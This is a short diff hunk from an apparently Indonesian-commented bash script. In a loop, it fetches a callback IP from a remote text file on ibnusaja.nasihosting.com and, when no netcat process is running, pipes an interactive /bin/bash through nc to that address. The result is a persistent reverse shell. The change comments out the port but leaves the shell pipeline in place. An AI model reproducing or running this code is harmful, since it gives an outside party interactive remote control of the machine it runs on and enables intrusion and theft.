@@ -20,9 +20,9 @@ while true; do
 
  if [ "$(pgrep -f ./nc)" = "" ]; then
   IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
-  PORT="29399"
+  # PORT="29399"
   matikanNc > /dev/null 2> /dev/null &
-  cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f
+  cat /tmp/f | /bin/bash -i 2>&1 | nc $IP > /tmp/f
  fi
 
  # echo "sudah jalan"
